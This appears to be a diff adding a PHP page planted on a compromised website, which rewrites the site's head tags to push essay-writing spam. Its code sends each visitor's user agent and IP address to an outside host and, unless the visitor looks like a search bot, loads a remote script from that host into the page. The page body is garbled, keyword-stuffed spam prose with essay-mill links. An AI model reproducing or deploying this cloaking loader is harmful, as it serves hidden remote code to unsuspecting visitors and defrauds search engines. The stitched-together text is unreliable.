@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Best Essay Writers Of All Time Turnout Reparations Keepers Believable best essay writers of all time Understudy Basket Testes Ed Biography | purplecube.in</title>
+<meta name="description" content="Comprehend a view versus a scope s value. | Best Essay Writers Of All Time" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>best essay writers of all time Obligation Phone Keonig Eggs</h1>I believe that leadership skill set can help to advocate for <a href="http://purplecube.in/order-an-essay-paper">order an essay paper</a> c in my workplace in the future, as I am always ready for new challenges and I hope to meet the requirements and to take extra responsibility. <p>Try again or visit Twitter Status for more information. In large companies with truly thoroughness prescribe the smallest details of how staff should look like, londin disobedience to is punishable. The system lpndon nursing practice, in the sense cg it provides the mechanism by which the nursing uses their views, knowledge and skills to diagnose and treat the client's response to actual or potential health. It is essential to note that nursing - is also a part of the health care system, which includes the activities of health promotion, disease prevention, providing psychosocial support and care to individuals with physical and mental illness, as well as disabled people of all best essay writers of all time groups. The film, of course, is about love. Are you sure you want to view these Tweets. <strong>best essay writers of all time</strong> Universal requirement for both sexes is a neat appearance.</p> <h2>Click start or perhaps the windows brand and then run.</h2>Parenthood Being the head of a large family - is not an easy task. <p>Whether we like it or not, but the appearance of staff is receiving increasing attention. Its better not to leave it last minute, because that londkn the essay has more time to take shape, and you can find more ways to re-write it and fix it up. Nurses also receive the name the profession, based on this science, which is devoted primarily to rwiting diagnosis and treatment of health problems or potential. I cv writing service best essay writers of all time london in a discipline and in limits that each person ahs to put for himself in certain situations, as I think such measures will help a person grow professionally much faster. I would like to <strong>best essay writers of all time</strong> have more spare time in order to devote it to my interests that are my profession and I hope that in near future I will create a timetable to follow. Any deadline given to you before then is a school internal deadline. Keep up the good work. And while all this a hundred times already, we have seen, heard and seevice, to break away from such a spectacle there londpn no desire.</p> <h2>Ensure you have the permission first thing.</h2>Perhaps, because the actors know their business, they created a cozy atmosphere of a good romantic comedy. <p>Critical thinking in nursing is based on the foundation of questions and writjng a complex situation and how to deal with this situation, according to Nursing practice standards (2013). Heck, I keep re-writing my 911 custom essay reviews in my blog because there are always things I want to add or re-write. Considering the strengths, I can say cv writing service london I love my profession and I am always ready to study something new, to make plans for the future, to grow as a professional. Considering the experience in our work environment, the next important issue to be pointed out is tardiness in our company. Cv writing service london I would like to point some innovations in our team work, as nowadays the successful work of the team is a trend of the guaranteed prosperity of a company. And also I encourage the active discussions among all the staff to solve problems together and think out of the box, to be always updated on innovations.</p> <h2>If so you ll not be glad but you make friends and will get it over..</h2>Nurse's unique approach focuses on the study of the response of the individual or group to a health problem or <strong>cv writing service london,</strong> and, from another perspective, in addition to servicr substitution of the need of every human being to take care of yourself from the views bio writijg and holistic. <p>I would like to admit that intimate subject was raised quite soberly - the line between comedy on an intimate and erotic themes were not crossed. Selecting the lady of lpndon heart, Marcus seduces his most refined manner and releases it on all four sides. Our professional best essay writers of all time writers are always ready to help you wrting essays. but absolutely best essay writers of all time there is no desire to criticize. There should also be a certain limit for tardiness and from today it will be allowed <a href="http://purplecube.in/how-to-buy-a-car-process-essay">how to buy a car process essay</a> londkn come best essay writers of all time later once in three cv writing service london, <a href="http://purplecube.in/essay-writer-discount-code">essay writer discount code</a> because of the obvious reason of course. Please respect your company and your colleagues. Learn moreThe URL of this tweet is below. It can be said that immigration is hand the international community recognizes the right of citizens to freedom of movement, on the other hand, this freedom is limited by considerations of national security, economic interests, and local policy, according to Jay Weinstein (2010).</p> <h2>By imagining what theme should come first and so forth coordinate the paragraphs.</h2>We will start organizing regular staff meetings with duration of 30 minutes each Thursday, to share creative ideas, innovations, opinions and propositions all the staff. <p>Cancel Delete Close Promote this Tweet Close Block Cancel Block Add a location to your Tweets When you writinh with a location, Twitter stores that location. I only began procrastinating erviews I started uni. Copy it to easily share with friends. This is a typical story of such complex human cv writing service london like love, when the main writijg, desperately tired of carnal love (that night, and under a blanket), morally evolves into a spiritual quest for love (from which the heart beats loudly and stops breathing). It is unacceptable to have bitten nails with black edging, loose long hair, crumpled, not fresh clothes or dirty shoes. Considering the dress code, I remind you the basic dress code requirements. There are rules to be obeyed and a person, who, by some severe reason is not able to arrive on time, should <a href="http://purplecube.in/custom-college-essay">custom college essay</a> call to warn the secretary.</p> <h2>The tattoo can be a single-word if not several sentences or letter.</h2>I think that leadership skills are extremely important and it is important to be able to use them. <p>Welcome to 911 CUSTOM ESSAY Twitter Page. And also, about how sex affects the work and careers, how to give women a favor, and who the <a href="http://purplecube.in/research-paper-service">research paper service</a> tempting demons actually are. Being reliable and a true professional is <strong>best essay writers of all time</strong> what a modern society needs. Its problematic both because of the quality your essay, and c ustom because of time management.</p>
+                  </div>
+               </div>
